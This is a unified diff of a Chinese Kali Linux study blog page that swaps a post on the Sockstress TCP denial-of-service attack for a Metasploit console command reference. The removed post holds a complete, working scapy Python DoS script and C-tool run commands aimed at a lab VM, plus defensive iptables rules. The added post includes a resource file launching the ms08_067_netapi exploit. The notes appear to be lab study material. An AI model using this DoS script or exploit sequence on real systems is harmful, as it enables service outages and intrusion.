@@ -79,18 +79,16 @@
 
 
 
-<meta name="description" content="1. Sockstress 2008年由Jack C.Louis发现 针对TCP服务的拒绝服务攻击 消耗被攻击目标系统资源，不消耗网络带宽自宽 与攻击目标建立socket连接 ▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据） 攻击者资源消耗小（CPU、内存、带宽） 异步攻击，单机可拒绝服务高配资源服务器 Window窗口实现TCP流控    2. 实验准备 Ka">
+<meta name="description" content="1. 基本使用 使用前先升级：msfupdate Msfcli使用接口 Msfconsole使用接口 最流行的用户接口 几乎可以使用全部MSF功能 控制台命令支持TAB自动补齐 支持外部命令的执行（系统命令等） 启动方式：点击鼠标启动 &#x2F; msfconsole -h &#x2F; exit -q（安静方式启动） -r（资源文件） -v（版本信息）   help &#x2F; ? &#x2F; help vulns    2.">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(八十一)：Sockstress">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;09&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(九十八)：MSF控制台命令">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;26&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AB)%EF%BC%9AMSF%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. Sockstress 2008年由Jack C.Louis发现 针对TCP服务的拒绝服务攻击 消耗被攻击目标系统资源，不消耗网络带宽自宽 与攻击目标建立socket连接 ▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据） 攻击者资源消耗小（CPU、内存、带宽） 异步攻击，单机可拒绝服务高配资源服务器 Window窗口实现TCP流控    2. 实验准备 Ka">
+<meta property="og:description" content="1. 基本使用 使用前先升级：msfupdate Msfcli使用接口 Msfconsole使用接口 最流行的用户接口 几乎可以使用全部MSF功能 控制台命令支持TAB自动补齐 支持外部命令的执行（系统命令等） 启动方式：点击鼠标启动 &#x2F; msfconsole -h &#x2F; exit -q（安静方式启动） -r（资源文件） -v（版本信息）   help &#x2F; ? &#x2F; help vulns    2.">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&amp;file_name=&#x2F;sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG">
-<meta property="og:updated_time" content="2020-02-09T13:38:42.453Z">
+<meta property="og:updated_time" content="2020-02-26T06:42:10.465Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&amp;file_name=&#x2F;sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG">
 
 
 
@@ -120,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/09/Kali Linux笔记(八十一)：Sockstress/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/26/Kali Linux笔记(九十八)：MSF控制台命令/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(八十一)：Sockstress | Tomas'Blog</title>
+  <title>Kali Linux笔记(九十八)：MSF控制台命令 | Tomas'Blog</title>
   
 
 
@@ -245,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AB)%EF%BC%9AMSF%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -262,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(八十一)：Sockstress</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十八)：MSF控制台命令</h1>
         
 
         <div class="post-meta">
@@ -274,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:34:04+08:00">
-                2020-02-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T14:44:34+08:00">
+                2020-02-26
               </time>
             
 
@@ -328,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  857 字
+                  688 字
                 </span>
               
 
@@ -344,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  2 分钟
                 </span>
               
             </div>
@@ -366,83 +364,87 @@
 
       
         <hr>
-<h4 id="1-Sockstress"><a href="#1-Sockstress" class="headerlink" title="1. Sockstress"></a>1. Sockstress</h4><ul>
-<li>2008年由Jack C.Louis发现</li>
-<li>针对TCP服务的拒绝服务攻击<ul>
-<li>消耗被攻击目标系统资源，不消耗网络带宽自宽</li>
-<li>与攻击目标建立socket连接</li>
-<li>▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据）</li>
-<li>攻击者资源消耗小（CPU、内存、带宽）</li>
-<li>异步攻击，单机可拒绝服务高配资源服务器</li>
-<li>Window窗口实现TCP流控</li>
+<h4 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h4><ul>
+<li>使用前先升级：msfupdate</li>
+<li>Msfcli使用接口</li>
+<li>Msfconsole使用接口<ul>
+<li>最流行的用户接口</li>
+<li>几乎可以使用全部MSF功能</li>
+<li>控制台命令支持TAB自动补齐</li>
+<li>支持外部命令的执行（系统命令等）</li>
+<li>启动方式：点击鼠标启动 / msfconsole -h / exit<ul>
+<li>-q（安静方式启动）</li>
+<li>-r（资源文件）</li>
+<li>-v（版本信息）</li>
+</ul>
+</li>
+<li>help / ? / help vulns</li>
 </ul>
 </li>
 </ul>
-<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
-<li>Kali（攻击者）<ul>
-<li>网卡方式为NAT/Bridge方式，NAT/桥接到无线网络，检查网络</li>
+<h4 id="2-MSF控制台命令–基本命令"><a href="#2-MSF控制台命令–基本命令" class="headerlink" title="2. MSF控制台命令–基本命令"></a>2. MSF控制台命令–基本命令</h4><ul>
+<li><strong><code>🔺命令：banner</code></strong>：MSF的banner信息，每次都有不一样的tips</li>
+<li><strong><code>🔺命令：color</code></strong>：改变使用模块颜色提示</li>
+<li><strong><code>🔺命令：connect -h</code></strong>：同nc，可以连接其他终端等</li>
+<li><strong><code>🔺命令：show auxiliary / exploits / payloads / encoders / nops</code></strong>：显示可用资源</li>
+<li><strong><code>🔺命令：search usermap_script / help search</code></strong>：搜索所需资源的位置<ul>
+<li><strong><code>🔺命令：search name:mysql / path:scada / platform:aix / type:aux /author:aaron / cve:2011</code></strong>（可多条件同时搜索）</li>
 </ul>
 </li>
-<li>Metasploit（被攻击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：use dos/windows/smb/ms09_001_write</code></strong>：使用模块<ul>
+<li><strong><code>🔺命令：info</code></strong>：显示模块具体信息</li>
+<li><strong><code>🔺命令：show options / payloads / targets / advanced / evasion / missing</code></strong></li>
+<li><strong><code>🔺命令：edit</code></strong>：对模块内容进行修改</li>
 </ul>
 </li>
-</ul>
-<h4 id="3-实验–Python脚本"><a href="#3-实验–Python脚本" class="headerlink" title="3. 实验–Python脚本"></a>3. 实验–Python脚本</h4><ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li>python脚本：<strong><code>🔺命令：./sockstress.py Metasploit的IP 21 200</code></strong></li>
-<li>▲ 2020.2.9此脚本攻击效果甚微弱</li>
+<li><strong><code>🔺命令：check</code></strong>：探测目标服务器是否存在此漏洞利用模块的漏洞，不利用模块</li>
+<li><strong><code>🔺命令：back</code></strong>：退出此漏洞利用模块</li>
+<li><strong><code>🔺命令：set / unset</code></strong>：设置命令</li>
+<li><strong><code>🔺命令：setg / unsetg</code></strong>：全局变量设置</li>
+<li><strong><code>🔺命令：save</code></strong>：对全局变量设置的保存，文件默认保存在/root/.msf4/config</li>
+<li><strong><code>🔺命令：run / exploit -j</code></strong>：前后台模式<ul>
+<li>▲ 执行此模块，需设置target和payload</li>
 </ul>
 </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line">import sys</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./sockstress.py [目标IP] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./sockstress.py 10.0.0.5 21 20 ## 请确定被攻击端口处于开放状态&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dstport = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">## 攻击函数</span><br><span class="line">def sockstress(target,dstport):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        try:</span><br><span class="line">            x = random.randint(0,65535)</span><br><span class="line">            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags=&quot;S&quot;),timeout=1,verbose=0)</span><br><span class="line">            send(IP(dst=target)/TCP(sport=x,dport=dstport,window=0,flags=&quot;A&quot;,ack=(response[TCP].seq+1))/&apos;\x00\x00&apos;,verbose=0)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">## 停止攻击函数</span><br><span class="line">def shutdown(signal,frame):</span><br><span class="line">    print &quot;正在恢复iptables 规则&quot;</span><br><span class="line">    os.system(&apos;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">## 添加iptables规则</span><br><span class="line">os.system(&apos;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">signal.signal(signal.SIGINT,shutdown)</span><br><span class="line"></span><br><span class="line">## 多线程攻击</span><br><span class="line">print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;</span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(sockstress,(target,dstport))</span><br><span class="line"></span><br><span class="line">## 永远执行</span><br><span class="line">while 0==0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
-<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
-<li><strong><code>🔺命令：Free -m</code></strong>（查看系统所用资源）</li>
+<li><strong><code>🔺命令：session</code></strong>：攻击成功建立的会话 <ul>
+<li><strong><code>🔺命令：session -l / -i</code></strong>（Shell Meterpreter sessionVNC） </li>
 </ul>
 </li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&file_name=/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" alt="服务器资源图"></p>
-<h4 id="4-实验–C脚本"><a href="#4-实验–C脚本" class="headerlink" title="4. 实验–C脚本"></a>4. 实验–C脚本</h4><ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li>防火墙规则：<strong><code>🔺命令：iptables -A OUTPUT -p TCP --tcp-flags rst rst -d Metasploit的IP -j DROP</code></strong></li>
-<li>下载地址：<a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">https://github.com/defuse/sockstress</a> </li>
-<li><strong><code>🔺命令：gcc -Wall -c sockstress.c</code></strong> </li>
-<li><strong><code>🔺命令：gcc -pthread -o sockstress sockstress.o</code></strong> </li>
-<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0</code></strong> </li>
-<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0 -p payloads/http -d 10</code></strong></li>
-</ul>
-</li>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
-<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
-<li><strong><code>🔺命令：free -m</code></strong>（查看系统所用资源）</li>
+<li><strong><code>🔺命令：load / unload</code></strong>：进行外部模块的导入，如openvas/Nessus</li>
+<li><strong><code>🔺命令：loadpath</code></strong>：▲ 调用自开的模块</li>
+<li><strong><code>🔺命令：route</code></strong>：通过指定session路由流量，通往内网的流量</li>
+<li><strong><code>🔺命令：irb</code></strong>：编程开发接口（Framework::Version）</li>
+<li><strong><code>🔺命令：resource</code></strong>：导入已设置的rc资源文件（<strong><code>🔺命令：▲ msfconsole -r a.rc</code></strong>）<ul>
+<li><strong><code>🔺命令：vi /root/Desktop/a.rc</code></strong></li>
+<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong></li>
+<li><strong><code>🔺命令：set RHOST 192.168.0.121</code></strong></li>
+<li><strong><code>🔺命令：set LHOST 192.168.0.107</code></strong></li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：exploit -j</code></strong></li>
 </ul>
 </li>
 </ul>
-<h4 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h4><ul>
-<li>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式</li>
-<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效（syn cookie对半步连接有效）</li>
-<li>根本的防御方法是采用白名单（不实际）</li>
-<li>折中对策：限制单位时间内每IP建的TCP连接数<ul>
-<li>封杀每30秒与80端口建立连接10个的IP地址</li>
-<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></strong></li>
-<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></strong></li>
-<li>以上规则对DDoS攻击无效</li>
+<h4 id="3-MSF控制台命令–数据库指令"><a href="#3-MSF控制台命令–数据库指令" class="headerlink" title="3. MSF控制台命令–数据库指令"></a>3. MSF控制台命令–数据库指令</h4><ul>
+<li><strong><code>🔺命令：db_status</code></strong>：数据库的状态</li>
+<li><strong><code>🔺命令：db_rebuild_cache</code></strong>：重建缓存模块：</li>
+<li><strong><code>🔺命令：db_disconnect / db_connect</code></strong>：数据库的连接<ul>
+<li><strong><code>🔺命令：db_disconnect -h</code></strong>（参数）</li>
+<li><strong><code>🔺命令：db_disconnect /usr/share/metasploit-framework/config/database.yml</code></strong> </li>
 </ul>
 </li>
-<li>▲ 可在Metasploit中加入iptables规则，Kali进行DoS尝试</li>
+<li><strong><code>🔺命令：db_import / db_export</code></strong>：对信息进行备份和导出：<ul>
+<li><strong><code>🔺命令：db_import /root/nmap.xml</code></strong>（<strong><code>🔺命令：nmap 192.168.0.0/24 -oX</code></strong> → 导出为xml文件）</li>
+<li><strong><code>🔺命令：db_export -f xml /root/bak.xml</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：db_nmap：同namp，但数据会自动保存到数据库</code></strong><ul>
+<li><strong><code>🔺命令：host / host 1.1.1.1 / hosts -u（开机状态） / hosts -c（指定列的名称） address,os_flavor / -S（搜索模式）Linux/window/121/1</code></strong></li>
+<li><strong><code>🔺命令：services -p 80 / services -c（指定列的名称）info,name -p 1-1000 / -S （搜索模式）</code></strong></li>
+<li><strong><code>🔺命令：vulns / loot</code></strong>（hashdump）</li>
+<li><strong><code>🔺命令：creds--mysql_login</code></strong>（msf存在暴力破解mysql的模块，可以进行exploit）</li>
+</ul>
+</li>
 </ul>
 
       
@@ -474,8 +476,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81)%EF%BC%9ASmurf/" rel="next" title="Kali Linux笔记(八十)：Smurf">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(八十)：Smurf
+              <a href="/2020/02/20/README/" rel="next" title="写在最前">
+                <i class="fa fa-chevron-left"></i> 写在最前
               </a>
             
           </div>
@@ -483,10 +485,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/" rel="prev" title="Kali Linux笔记(八十二)：TearDrop">
-                Kali Linux笔记(八十二)：TearDrop <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -656,7 +654,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Sockstress"><span class="nav-number">1.</span> <span class="nav-text">1. Sockstress</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-实验准备"><span class="nav-number">2.</span> <span class="nav-text">2. 实验准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-实验–Python脚本"><span class="nav-number">3.</span> <span class="nav-text">3. 实验–Python脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-实验–C脚本"><span class="nav-number">4.</span> <span class="nav-text">4. 实验–C脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-防御措施"><span class="nav-number">5.</span> <span class="nav-text">5. 防御措施</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-基本使用"><span class="nav-number">1.</span> <span class="nav-text">1. 基本使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-MSF控制台命令–基本命令"><span class="nav-number">2.</span> <span class="nav-text">2. MSF控制台命令–基本命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-MSF控制台命令–数据库指令"><span class="nav-number">3.</span> <span class="nav-text">3. MSF控制台命令–数据库指令</span></a></li></ol></div>
             
 
           </div>
